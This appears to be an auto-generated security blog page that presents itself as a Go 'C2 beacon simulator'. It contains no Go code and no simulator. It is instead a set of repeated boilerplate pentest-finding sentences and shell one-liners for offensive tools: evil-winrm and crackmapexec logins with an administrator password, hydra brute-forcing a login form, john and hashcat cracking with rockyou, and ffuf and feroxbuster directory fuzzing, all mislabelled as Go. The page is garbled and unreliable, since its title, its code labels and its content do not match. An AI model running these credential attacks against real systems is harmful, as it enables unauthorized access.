---
TitleSEO: "C2 Beacon Simulator in Go | ZureFX"
TitlePost: "C2 Beacon Simulator — Go"
Author: "ZureFX"
Description: "A Go script for c2 beacon simulator. Built for security research and automation."
Keywords: "automation, c, script, go"
URL: "https://zurefx.github.io/scripting/script-c2-beacon-simulator-418.html"
URL_IMAGES: ""
Date: "2025-10-30"
Tags: "Automation, C, Script, Go"
Section: "scripting"
Lang: "en"
main_img: "script-c2-beacon-simulator-418"
Permalink: "/scripting/script-c2-beacon-simulator-418.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The scheduled task ran with elevated privileges and could be abused for escalation. Lateral movement was facilitated by reusing discovered credentials across services. Group Policy Preferences contained encrypted but recoverable credentials.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `pwncat`
- `netcat`
- `pwncat`

## Implementation

### Core Logic

Lateral movement was facilitated by reusing discovered credentials across services. The scheduled task ran with elevated privileges and could be abused for escalation.

```go
feroxbuster -h
```

The scheduled task ran with elevated privileges and could be abused for escalation. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Helper Functions

Privilege escalation was possible due to misconfigured sudo permissions. The application stored sensitive credentials in an unencrypted configuration file.

```go
evil-winrm -i 10.90.146.139 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.89.98.117/FUZZ
evil-winrm -i 10.58.221.209 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.60.194.20 -u administrator -p 'P@ssw0rd!' --shares
```

## Usage

### Basic Usage

The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.19.151.88 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Advanced Options

Network traffic analysis revealed unencrypted communications containing user credentials. The kernel version was outdated and vulnerable to a publicly known exploit. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.83.128.234/FUZZ
```

## Output

### Example Output

The application stored sensitive credentials in an unencrypted configuration file. Unconstrained delegation was enabled on the compromised machine.

```
[+] Scanning target...
[+] Found 6 results
[+] Done in 28.60s
```
